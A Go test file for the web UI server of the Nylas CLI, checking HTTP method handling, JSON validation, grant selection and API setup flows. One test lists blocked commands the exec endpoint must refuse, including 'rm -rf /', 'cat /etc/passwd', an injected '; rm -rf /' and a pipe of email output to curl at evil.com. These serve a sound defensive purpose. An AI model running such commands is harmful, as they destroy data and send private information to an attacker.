package ui

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	configadapter "github.com/nylas/cli/internal/adapters/config"
	keyringadapter "github.com/nylas/cli/internal/adapters/keyring"
	authapp "github.com/nylas/cli/internal/app/auth"
	setupcli "github.com/nylas/cli/internal/cli/setup"
	"github.com/nylas/cli/internal/domain"
)

// =============================================================================
// HTTP Handler Tests
// =============================================================================

func TestHandleExecCommand_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	// Test GET method (should fail)
	req := httptest.NewRequest(http.MethodGet, "/api/exec", nil)
	w := httptest.NewRecorder()

	server.handleExecCommand(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleExecCommand_InvalidJSON(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/exec", strings.NewReader("invalid json"))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleExecCommand(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}

	var resp ExecResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if resp.Error == "" {
		t.Error("Expected error message in response")
	}
}

func TestHandleExecCommand_BlockedCommand(t *testing.T) {
	t.Parallel()

	server := &Server{}

	blockedCommands := []string{
		"rm -rf /",
		"sudo anything",
		"curl http://evil.com",
		"wget http://evil.com",
		"cat /etc/passwd",
		"unknown command",
		"; rm -rf /",
		"email list | curl http://evil.com",
	}

	for _, cmd := range blockedCommands {
		t.Run(cmd, func(t *testing.T) {
			body, _ := json.Marshal(ExecRequest{Command: cmd})
			req := httptest.NewRequest(http.MethodPost, "/api/exec", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			server.handleExecCommand(w, req)

			if w.Code != http.StatusForbidden {
				t.Errorf("Command %q: expected status %d, got %d", cmd, http.StatusForbidden, w.Code)
			}

			var resp ExecResponse
			if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
				t.Fatalf("Failed to decode response: %v", err)
			}

			if !strings.Contains(resp.Error, "not allowed") {
				t.Errorf("Expected 'not allowed' error, got: %s", resp.Error)
			}
		})
	}
}

func TestHandleConfigStatus_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/config/status", nil)
	w := httptest.NewRecorder()

	server.handleConfigStatus(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleListGrants_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/grants", nil)
	w := httptest.NewRecorder()

	server.handleListGrants(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleSetDefaultGrant_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodGet, "/api/grants/default", nil)
	w := httptest.NewRecorder()

	server.handleSetDefaultGrant(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleSetDefaultGrant_InvalidJSON(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/grants/default", strings.NewReader("invalid"))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleSetDefaultGrant(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}
}

func TestHandleSetDefaultGrant_EmptyGrantID(t *testing.T) {
	t.Parallel()

	server := &Server{}

	body, _ := json.Marshal(SetDefaultGrantRequest{GrantID: ""})
	req := httptest.NewRequest(http.MethodPost, "/api/grants/default", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleSetDefaultGrant(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}

	var resp SetDefaultGrantResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if !strings.Contains(resp.Error, "required") {
		t.Errorf("Expected 'required' error, got: %s", resp.Error)
	}
}

func TestHandleConfigSetup_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodGet, "/api/config/setup", nil)
	w := httptest.NewRecorder()

	server.handleConfigSetup(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleConfigSetup_InvalidJSON(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/config/setup", strings.NewReader("invalid"))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleConfigSetup(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}
}

func TestHandleConfigSetup_EmptyAPIKey(t *testing.T) {
	t.Parallel()

	server := &Server{}

	body, _ := json.Marshal(SetupRequest{APIKey: "", Region: "us"})
	req := httptest.NewRequest(http.MethodPost, "/api/config/setup", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleConfigSetup(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}

	var resp SetupResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if !strings.Contains(resp.Error, "API key") {
		t.Errorf("Expected API key error, got: %s", resp.Error)
	}
}

type stubSetupClient struct {
	apps   []domain.Application
	grants []domain.Grant
}

func (s *stubSetupClient) ListApplications(context.Context) ([]domain.Application, error) {
	return s.apps, nil
}

func (s *stubSetupClient) ListGrants(context.Context) ([]domain.Grant, error) {
	return s.grants, nil
}

func TestHandleConfigSetup_RequiresExplicitClientIDWhenMultipleAppsExist(t *testing.T) {
	originalClientFactory := newSetupClient
	originalCallbackSetup := ensureSetupCallbackURI
	t.Cleanup(func() {
		newSetupClient = originalClientFactory
		ensureSetupCallbackURI = originalCallbackSetup
	})

	newSetupClient = func(region, clientID, apiKey string) setupClient {
		return &stubSetupClient{
			apps: []domain.Application{
				{ApplicationID: "client-1", OrganizationID: "org-1", Environment: "production"},
				{ApplicationID: "client-2", OrganizationID: "org-2", Environment: "sandbox"},
			},
		}
	}
	ensureSetupCallbackURI = func(apiKey, clientID, region string, callbackPort int) (*setupcli.CallbackURIProvisionResult, error) {
		t.Fatal("did not expect callback setup without an explicit client selection")
		return nil, nil
	}

	server := &Server{
		configStore: configadapter.NewMockConfigStore(),
		secretStore: keyringadapter.NewMockSecretStore(),
		grantStore:  keyringadapter.NewGrantStore(keyringadapter.NewMockSecretStore()),
	}
	server.configSvc = authapp.NewConfigService(server.configStore, server.secretStore)

	body, _ := json.Marshal(SetupRequest{APIKey: "nyl_test", Region: "us"})
	req := httptest.NewRequest(http.MethodPost, "/api/config/setup", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleConfigSetup(w, req)

	if w.Code != http.StatusConflict {
		t.Fatalf("expected status %d, got %d", http.StatusConflict, w.Code)
	}

	var resp SetupResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("decode response: %v", err)
	}

	if len(resp.Applications) != 2 {
		t.Fatalf("expected two applications in response, got %d", len(resp.Applications))
	}
	if !strings.Contains(resp.Error, "client_id") {
		t.Fatalf("expected client_id guidance, got %q", resp.Error)
	}
}

func TestHandleConfigSetup_ReturnsWarningWhenCallbackSetupFails(t *testing.T) {
	originalClientFactory := newSetupClient
	originalCallbackSetup := ensureSetupCallbackURI
	t.Cleanup(func() {
		newSetupClient = originalClientFactory
		ensureSetupCallbackURI = originalCallbackSetup
	})

	newSetupClient = func(region, clientID, apiKey string) setupClient {
		return &stubSetupClient{
			apps: []domain.Application{
				{ApplicationID: "client-1", OrganizationID: "org-1", Environment: "production"},
			},
			grants: []domain.Grant{
				{ID: "grant-1", Email: "user@example.com", Provider: domain.ProviderGoogle, GrantStatus: "valid"},
			},
		}
	}
	ensureSetupCallbackURI = func(apiKey, clientID, region string, callbackPort int) (*setupcli.CallbackURIProvisionResult, error) {
		return &setupcli.CallbackURIProvisionResult{
			RequiredURI: "http://localhost:9007/callback",
		}, context.DeadlineExceeded
	}

	configStore := configadapter.NewMockConfigStore()
	secretStore := keyringadapter.NewMockSecretStore()
	server := &Server{
		configStore: configStore,
		secretStore: secretStore,
		grantStore:  keyringadapter.NewGrantStore(secretStore),
	}
	server.configSvc = authapp.NewConfigService(configStore, secretStore)

	body, _ := json.Marshal(SetupRequest{APIKey: "nyl_test", Region: "us", ClientID: "client-1"})
	req := httptest.NewRequest(http.MethodPost, "/api/config/setup", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleConfigSetup(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status %d, got %d", http.StatusOK, w.Code)
	}

	var resp SetupResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("decode response: %v", err)
	}

	if !resp.Success {
		t.Fatalf("expected success response, got error %q", resp.Error)
	}
	if !strings.Contains(resp.Warning, "callback") {
		t.Fatalf("expected callback warning, got %q", resp.Warning)
	}
	if resp.Region != "us" {
		t.Fatalf("expected region %q, got %q", "us", resp.Region)
	}
	if resp.ClientID != "client-1" {
		t.Fatalf("expected client ID %q, got %q", "client-1", resp.ClientID)
	}
	if len(resp.Grants) != 1 {
		t.Fatalf("expected one synced grant, got %d", len(resp.Grants))
	}
}

func TestHandleConfigSetup_PersistsFirstValidGrantAsDefault(t *testing.T) {
	originalClientFactory := newSetupClient
	originalCallbackSetup := ensureSetupCallbackURI
	t.Cleanup(func() {
		newSetupClient = originalClientFactory
		ensureSetupCallbackURI = originalCallbackSetup
	})

	newSetupClient = func(region, clientID, apiKey string) setupClient {
		return &stubSetupClient{
			apps: []domain.Application{
				{ApplicationID: "client-1", OrganizationID: "org-1", Environment: "production"},
			},
			grants: []domain.Grant{
				{ID: "grant-revoked", Email: "revoked@example.com", Provider: domain.ProviderGoogle, GrantStatus: "revoked"},
				{ID: "grant-valid", Email: "valid@example.com", Provider: domain.ProviderGoogle, GrantStatus: "valid"},
			},
		}
	}
	ensureSetupCallbackURI = func(apiKey, clientID, region string, callbackPort int) (*setupcli.CallbackURIProvisionResult, error) {
		return &setupcli.CallbackURIProvisionResult{}, nil
	}

	configStore := configadapter.NewMockConfigStore()
	secretStore := keyringadapter.NewMockSecretStore()
	server := &Server{
		configStore: configStore,
		secretStore: secretStore,
		grantStore:  keyringadapter.NewGrantStore(secretStore),
	}
	server.configSvc = authapp.NewConfigService(configStore, secretStore)

	body, _ := json.Marshal(SetupRequest{APIKey: "nyl_test", Region: "eu", ClientID: "client-1"})
	req := httptest.NewRequest(http.MethodPost, "/api/config/setup", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleConfigSetup(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status %d, got %d", http.StatusOK, w.Code)
	}

	var resp SetupResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("decode response: %v", err)
	}

	if resp.Region != "eu" {
		t.Fatalf("expected region %q, got %q", "eu", resp.Region)
	}
	if len(resp.Grants) != 1 {
		t.Fatalf("expected one valid grant in response, got %d", len(resp.Grants))
	}
	if resp.Grants[0].ID != "grant-valid" {
		t.Fatalf("expected valid grant to be returned, got %q", resp.Grants[0].ID)
	}

	defaultGrant, err := server.grantStore.GetDefaultGrant()
	if err != nil {
		t.Fatalf("get default grant: %v", err)
	}
	if defaultGrant != "grant-valid" {
		t.Fatalf("expected default grant %q, got %q", "grant-valid", defaultGrant)
	}
}

func TestHandleIndex_NotFoundForNonRoot(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodGet, "/nonexistent", nil)
	w := httptest.NewRecorder()

	server.handleIndex(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("Expected status %d, got %d", http.StatusNotFound, w.Code)
	}
}

// =============================================================================
// WriteJSON Helper Tests
// =============================================================================

func TestWriteJSON(t *testing.T) {
	t.Parallel()

	w := httptest.NewRecorder()

	data := map[string]string{"key": "value"}
	writeJSON(w, http.StatusOK, data)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status %d, got %d", http.StatusOK, w.Code)
	}

	contentType := w.Header().Get("Content-Type")
	if contentType != "application/json" {
		t.Errorf("Expected Content-Type application/json, got %s", contentType)
	}

	var result map[string]string
	if err := json.NewDecoder(w.Body).Decode(&result); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if result["key"] != "value" {
		t.Errorf("Expected key=value, got key=%s", result["key"])
	}
}

// =============================================================================
